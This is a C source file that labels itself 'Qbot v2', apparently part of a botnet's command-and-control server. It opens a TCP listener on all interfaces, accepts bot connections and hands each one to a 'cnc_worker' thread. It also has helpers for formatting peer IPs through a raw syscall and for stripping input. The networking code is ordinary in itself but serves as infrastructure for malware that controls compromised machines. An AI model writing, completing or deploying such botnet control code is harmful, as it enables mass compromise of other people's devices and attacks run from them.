#include "headers/utils.h"

// function attempts to initialize a server fd /w a non-blocking socket.
int init_server_fd() {
    int server_fd = -1, opt = 1;

    if ((server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
        return -1;

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1)
        return -1;

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) == -1)
        return -1;

    return server_fd;
}

char *get_socket_ip(int sock, struct sockaddr_in addr) {
    unsigned long len = sizeof(addr);
    char ip[20] = {0};

    if (syscall(52, sock, (long)&addr, (long)&len) == 0) {
        unsigned char *p = (unsigned char *)&addr.sin_addr;
        unsigned long pos = 0;
        
        for (unsigned long i = 0; i < 4; i++) {
            unsigned long n = p[i];
            unsigned long div = 100;

            while (div) {
                unsigned long digit = n / div;
                if (digit || div == 1 || n >= div)
                    ip[pos++] = '0' + digit;

                n %= div;
                div /= 10;
            }
            if (i < 3)
                ip[pos++] = '.';
        }
        ip[pos] = '\0';
        return strdup(ip);
    }
    return NULL;
}

void *create_and_bind(int port, int max_clients) {
    int listen_fd = init_server_fd();
    if (listen_fd == -1) {
        printf("Failed to initialize listener FD.\n");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in listen_addr;
    memset(&listen_addr, 0, sizeof(listen_addr));

    listen_addr.sin_family = AF_INET;
    listen_addr.sin_port = htons(port);
    listen_addr.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0
    
    if (bind(listen_fd, (struct sockaddr *)&listen_addr, sizeof(listen_addr)) == -1) {
        perror("Error: bind() failed");
        close(listen_fd);
        exit(EXIT_FAILURE);
    }

    if (listen(listen_fd, max_clients) == -1) {
        perror("Error: listen() failed");
        close(listen_fd);
        exit(EXIT_FAILURE);
    }
    
    printf("\033[2J\033[H");
    printf("Qbot v2 is up:\nPort: %d\nMax-Clients: %d\n", port, max_clients);

    while (1) {
        int client_fd = -1;
        struct sockaddr_in *client_addr = malloc(sizeof(struct sockaddr_in));

        if (!client_addr) {
            perror("Failed to allocate client addr family");
            exit(EXIT_FAILURE);
        }

        socklen_t addr_len = sizeof(*client_addr);
        if ((client_fd = accept(listen_fd, (struct sockaddr *)client_addr, &addr_len)) == -1) {
            perror("Error: accept() failed!");
            free(client_addr);
            continue;
        }

        HandlerInfo *info = malloc(sizeof(HandlerInfo));
        if (!info) {
            perror("Error: failed to allocate memory for client connection."); // out of memory.
            free(client_addr);
            exit(EXIT_FAILURE);
        }  

        info->client_fd = client_fd;
        info->client_addr = client_addr;

        pthread_t worker_thread;
        if (pthread_create(&worker_thread, NULL, &cnc_worker, info) != 0) {
            perror("Failed to create worker thread!");
            close(client_fd);
            free(client_addr);
            free(info);
            continue;
        }
        pthread_detach(worker_thread);
    }
    close(listen_fd);
    return NULL;
}

void strip_input(char *buffer, int *sz) {
    if(buffer[*sz - 1] == '\r' || buffer[*sz - 1] == '\n')
        buffer[*sz - 1] = '\0', (*sz)--;

    if(buffer[*sz - 1] == '\r' || buffer[*sz - 1] == '\n')
        buffer[*sz - 1] = '\0', (*sz)--;
}